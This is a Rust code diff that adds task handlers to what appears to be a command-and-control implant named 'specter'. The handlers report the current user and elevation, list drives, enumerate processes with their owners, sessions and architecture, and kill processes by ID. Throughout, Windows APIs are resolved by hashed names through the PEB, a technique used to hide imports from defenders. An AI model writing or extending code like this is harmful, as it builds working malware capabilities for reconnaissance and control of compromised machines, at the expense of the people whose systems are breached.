@@ -35,6 +35,19 @@ const H_DELETE_FILE_A: u64 = fnv1a64(b"DeleteFileA");
 const H_COPY_FILE_A: u64 = fnv1a64(b"CopyFileA");
 const H_MOVE_FILE_A: u64 = fnv1a64(b"MoveFileA");
 const H_GET_FILE_ATTRIBUTES_A: u64 = fnv1a64(b"GetFileAttributesA");
+const H_LOOKUP_ACCOUNT_SID_A: u64 = fnv1a64(b"LookupAccountSidA");
+const H_GET_LOGICAL_DRIVES: u64 = fnv1a64(b"GetLogicalDrives");
+const H_GET_DRIVE_TYPE_A: u64 = fnv1a64(b"GetDriveTypeA");
+const H_CREATE_TOOLHELP32_SNAPSHOT: u64 = fnv1a64(b"CreateToolhelp32Snapshot");
+const H_PROCESS32_FIRST_W: u64 = fnv1a64(b"Process32FirstW");
+const H_PROCESS32_NEXT_W: u64 = fnv1a64(b"Process32NextW");
+const H_PROCESS_ID_TO_SESSION_ID: u64 = fnv1a64(b"ProcessIdToSessionId");
+const H_IS_WOW64_PROCESS: u64 = fnv1a64(b"IsWow64Process");
+const H_OPEN_PROCESS: u64 = fnv1a64(b"OpenProcess");
+const H_TERMINATE_PROCESS: u64 = fnv1a64(b"TerminateProcess");
+const H_OPEN_PROCESS_TOKEN: u64 = fnv1a64(b"OpenProcessToken");
+const H_GET_TOKEN_INFORMATION: u64 = fnv1a64(b"GetTokenInformation");
+const H_ADVAPI32: u64 = specter_core::fnv::fnv1a64_wide_ascii_ci("advapi32.dll");
 
 /// WIN32_FIND_DATAA tail: attributes at +0, ftLastWriteTime at +0x14,
 /// size (high:low) at +0x1C/+0x20, cFileName at +0x2C.
@@ -79,6 +92,10 @@ pub unsafe fn handle(instance: &mut Instance, task: Task, id: u32, results: &mut
         Task::Rm { .. } => rm(kernel32, &task, id, results),
         Task::Cp { .. } => copy_move(kernel32, &task, id, results, true),
         Task::Mv { .. } => copy_move(kernel32, &task, id, results, false),
+        Task::Getuid => getuid(kernel32, id, results),
+        Task::Disks => disks(kernel32, id, results),
+        Task::PsList => ps_list(kernel32, id, results),
+        Task::PsKill { pid } => ps_kill(kernel32, pid, id, results),
         Task::Sleep { .. } | Task::Terminate => {}
     }
 }
@@ -404,6 +421,308 @@ unsafe fn copy_move(
         transport::COMMAND_MV
     };
     let _ = transport::push_plain_result(results, id, command);
+}
+
+/// Process identity of an open handle: (arch byte, elevated, domain,
+/// username) — best effort, every failure degrades to defaults.
+/// `arch`: 0 x86-on-x64, 1 x64, 0xFF unknown.
+unsafe fn proc_identity(
+    kernel32: *mut c_void,
+    handle: isize,
+) -> (u8, bool, [u8; 32], u16, [u8; 32], u16) {
+    let mut domain = [0u8; 32];
+    let mut username = [0u8; 32];
+    let mut dlen = 0u16;
+    let mut ulen = 0u16;
+    let mut arch = 0xFFu8;
+    let mut elevated = false;
+
+    if !kernel32.is_null() && handle != 0 && handle != -1 {
+        let wow = peb::find_export(kernel32, H_IS_WOW64_PROCESS);
+        if !wow.is_null() {
+            let mut is_wow: i32 = 0;
+            let wow = *(wow as *const unsafe extern "system" fn(isize, *mut i32) -> i32);
+            if wow(handle, &mut is_wow) != 0 {
+                arch = if is_wow != 0 { 0 } else { 1 };
+            }
+        }
+    }
+
+    // Token: elevation + user SID.
+    if !kernel32.is_null() {
+        // advapi32 is only needed for the token trio; resolve through the
+        // PEB the way sysinfo does (advapi32 is in the PEB of any process
+        // that resolved GetUserNameA; otherwise the fields stay default).
+        let advapi32 =
+            specter_core::peb::find_module(crate::runtime::bootstrap::get_peb(), H_ADVAPI32);
+        if !advapi32.is_null() {
+            let open_token = peb::find_export(advapi32, H_OPEN_PROCESS_TOKEN);
+            let get_info = peb::find_export(advapi32, H_GET_TOKEN_INFORMATION);
+            let lookup = peb::find_export(advapi32, H_LOOKUP_ACCOUNT_SID_A);
+            if !open_token.is_null() && !get_info.is_null() && !lookup.is_null() {
+                let open_token = *(open_token
+                    as *const unsafe extern "system" fn(isize, u32, *mut isize) -> i32);
+                let get_info = *(get_info
+                    as *const unsafe extern "system" fn(
+                        isize,
+                        u32,
+                        *mut c_void,
+                        u32,
+                        *mut u32,
+                    ) -> i32);
+                let lookup = *(lookup
+                    as *const unsafe extern "system" fn(
+                        *const c_void,
+                        *const c_void,
+                        *mut u8,
+                        *mut u32,
+                        *mut u8,
+                        *mut u32,
+                        *mut u32,
+                    ) -> i32);
+                let mut token: isize = 0;
+                if open_token(handle, 0x0008, &mut token) != 0 {
+                    let mut elev: u32 = 0;
+                    let mut ret: u32 = 0;
+                    if get_info(token, 20, &mut elev as *mut u32 as *mut c_void, 4, &mut ret) != 0 {
+                        elevated = elev != 0;
+                    }
+                    // TOKEN_USER: a SID pointer at offset 0.
+                    let mut sid_buf = [0u8; 64];
+                    if get_info(token, 1, sid_buf.as_mut_ptr() as *mut c_void, 64, &mut ret) != 0 {
+                        let sid = u64::from_le_bytes([
+                            sid_buf[0], sid_buf[1], sid_buf[2], sid_buf[3], sid_buf[4], sid_buf[5],
+                            sid_buf[6], sid_buf[7],
+                        ]) as *const c_void;
+                        if !sid.is_null() {
+                            let mut dsize: u32 = 32;
+                            let mut usize_: u32 = 32;
+                            let mut use_: u32 = 0;
+                            if lookup(
+                                core::ptr::null(),
+                                sid,
+                                domain.as_mut_ptr(),
+                                &mut dsize,
+                                username.as_mut_ptr(),
+                                &mut usize_,
+                                &mut use_,
+                            ) != 0
+                            {
+                                dlen = dsize as u16;
+                                ulen = usize_ as u16;
+                            }
+                        }
+                    }
+                    if !kernel32.is_null() {
+                        let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
+                        if !close.is_null() {
+                            (*(close as *const unsafe extern "system" fn(isize) -> i32))(token);
+                        }
+                    }
+                }
+            }
+        }
+    }
+    (arch, elevated, domain, dlen, username, ulen)
+}
+
+unsafe fn getuid(kernel32: *mut c_void, id: u32, results: &mut Writer) {
+    // Current process identity: pseudo-handle -1 covers the token.
+    let (arch, elevated, domain, dlen, username, ulen) = proc_identity(kernel32, -1);
+    let _ = arch; // getuid reports elevation only (the native format)
+    let _ = transport::push_getuid_result(
+        results,
+        id,
+        elevated,
+        &domain[..dlen as usize],
+        &username[..ulen as usize],
+    );
+}
+
+unsafe fn disks(kernel32: *mut c_void, id: u32, results: &mut Writer) {
+    let drives = peb::find_export(kernel32, H_GET_LOGICAL_DRIVES);
+    let dtype = peb::find_export(kernel32, H_GET_DRIVE_TYPE_A);
+    if drives.is_null() || dtype.is_null() {
+        return;
+    }
+    let drives = *(drives as *const unsafe extern "system" fn() -> u32);
+    let dtype = *(dtype as *const unsafe extern "system" fn(*const u8) -> u32);
+    let mask = drives();
+    if mask == 0 {
+        error(kernel32, id, results);
+        return;
+    }
+    let mut roots = [b'A'; 26];
+    let mut count = 0usize;
+    let mut i = 0u32;
+    while i < 26 {
+        if mask & (1u32 << i) != 0 {
+            roots[count] = b'A' + i as u8;
+            count += 1;
+        }
+        i += 1;
+    }
+    if !transport::push_disks_header(results, id, count as u32) {
+        return;
+    }
+    let mut e = 0usize;
+    while e < count {
+        let letter = roots[e];
+        let mut path = [0u8; 4];
+        path[0] = letter;
+        path[1] = b':';
+        path[2] = b'\\';
+        let drive_type = dtype(path.as_ptr());
+        if !transport::push_disks_entry(results, letter, drive_type) {
+            return;
+        }
+        e += 1;
+    }
+}
+
+/// PROCESSENTRY32W offsets (x64): dwSize +0, pid +8, ppid +0x20,
+/// szExeFile (wide) +0x30 — struct size 0x238.
+const PE32W_SIZE: usize = 0x238;
+const PE32W_OFF_PID: usize = 0x08;
+const PE32W_OFF_PPID: usize = 0x20;
+const PE32W_OFF_NAME: usize = 0x30;
+const PE32W_NAME_WCAP: usize = 64;
+const PS_MAX_ENTRIES: u32 = 256;
+
+unsafe fn ps_list(kernel32: *mut c_void, id: u32, results: &mut Writer) {
+    let snap = peb::find_export(kernel32, H_CREATE_TOOLHELP32_SNAPSHOT);
+    let first = peb::find_export(kernel32, H_PROCESS32_FIRST_W);
+    let next = peb::find_export(kernel32, H_PROCESS32_NEXT_W);
+    let session = peb::find_export(kernel32, H_PROCESS_ID_TO_SESSION_ID);
+    let open = peb::find_export(kernel32, H_OPEN_PROCESS);
+    if snap.is_null() || first.is_null() || next.is_null() || session.is_null() || open.is_null() {
+        return;
+    }
+    let snap = *(snap as *const unsafe extern "system" fn(u32, u32) -> isize);
+    let first = *(first as *const unsafe extern "system" fn(isize, *mut u8) -> i32);
+    let next = *(next as *const unsafe extern "system" fn(isize, *mut u8) -> i32);
+    let session = *(session as *const unsafe extern "system" fn(u32, *mut u32) -> i32);
+    let open = *(open as *const unsafe extern "system" fn(u32, i32, u32) -> isize);
+
+    let handle = snap(0x2, 0); // TH32CS_SNAPPROCESS
+    if handle == -1 {
+        error(kernel32, id, results);
+        return;
+    }
+
+    let mut entry = [0u8; PE32W_SIZE];
+    entry[0] = PE32W_SIZE as u8;
+    entry[1] = (PE32W_SIZE >> 8) as u8;
+
+    // Entries land in a scratch writer first: the count precedes them.
+    let mut scratch = [0u8; 4096];
+    let mut sw = Writer::new(&mut scratch);
+    let mut count: u32 = 0;
+    let mut ok = first(handle, entry.as_mut_ptr()) != 0;
+    while ok && count < PS_MAX_ENTRIES {
+        let pid = u32::from_le_bytes([
+            entry[PE32W_OFF_PID],
+            entry[PE32W_OFF_PID + 1],
+            entry[PE32W_OFF_PID + 2],
+            entry[PE32W_OFF_PID + 3],
+        ]);
+        let ppid = u32::from_le_bytes([
+            entry[PE32W_OFF_PPID],
+            entry[PE32W_OFF_PPID + 1],
+            entry[PE32W_OFF_PPID + 2],
+            entry[PE32W_OFF_PPID + 3],
+        ]);
+        let mut sess = 0u32;
+        let _ = session(pid, &mut sess);
+
+        // Name: wide -> ACP bytes, bounded.
+        let mut nlen = 0usize;
+        while nlen < PE32W_NAME_WCAP && entry[PE32W_OFF_NAME + nlen * 2] != 0 {
+            nlen += 1;
+        }
+        let mut name = [0u8; 64];
+        let mut i = 0usize;
+        while i < nlen {
+            name[i] = if entry[PE32W_OFF_NAME + i * 2] < 0x80 {
+                entry[PE32W_OFF_NAME + i * 2]
+            } else {
+                b'?'
+            };
+            i += 1;
+        }
+
+        // Best-effort identity (PROCESS_QUERY_LIMITED_INFORMATION).
+        let ph = open(0x1000, 0, pid);
+        let (arch, elevated, domain, dlen, username, ulen) = proc_identity(kernel32, ph);
+        if ph != 0 {
+            let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
+            if !close.is_null() {
+                (*(close as *const unsafe extern "system" fn(isize) -> i32))(ph);
+            }
+        }
+
+        let proc = transport::PsEntry {
+            pid,
+            ppid,
+            session: sess,
+            arch,
+            elevated,
+            domain: &domain[..dlen as usize],
+            username: &username[..ulen as usize],
+            name: &name[..nlen],
+        };
+        if !transport::push_ps_entry(&mut sw, &proc) {
+            break;
+        }
+        count += 1;
+        ok = next(handle, entry.as_mut_ptr()) != 0;
+    }
+    let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
+    if !close.is_null() {
+        (*(close as *const unsafe extern "system" fn(isize) -> i32))(handle);
+    }
+
+    if count == 0 {
+        error(kernel32, id, results);
+        return;
+    }
+    if !transport::push_ps_list_header(results, id, count) {
+        return;
+    }
+    let bytes = sw.written_bytes();
+    let mut i = 0;
+    while i < bytes.len() {
+        if !results.push(&[bytes[i]]) {
+            return;
+        }
+        i += 1;
+    }
+}
+
+unsafe fn ps_kill(kernel32: *mut c_void, pid: u32, id: u32, results: &mut Writer) {
+    let open = peb::find_export(kernel32, H_OPEN_PROCESS);
+    let term = peb::find_export(kernel32, H_TERMINATE_PROCESS);
+    if open.is_null() || term.is_null() {
+        return;
+    }
+    let open = *(open as *const unsafe extern "system" fn(u32, i32, u32) -> isize);
+    let term = *(term as *const unsafe extern "system" fn(isize, u32) -> i32);
+    // PROCESS_TERMINATE.
+    let handle = open(0x0001, 0, pid);
+    if handle == -1 {
+        error(kernel32, id, results);
+        return;
+    }
+    let ok = term(handle, 1);
+    let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
+    if !close.is_null() {
+        (*(close as *const unsafe extern "system" fn(isize) -> i32))(handle);
+    }
+    if ok == 0 {
+        error(kernel32, id, results);
+        return;
+    }
+    let _ = transport::push_ps_kill_result(results, id, pid);
 }
 
 unsafe fn error(kernel32: *mut c_void, id: u32, results: &mut Writer) {
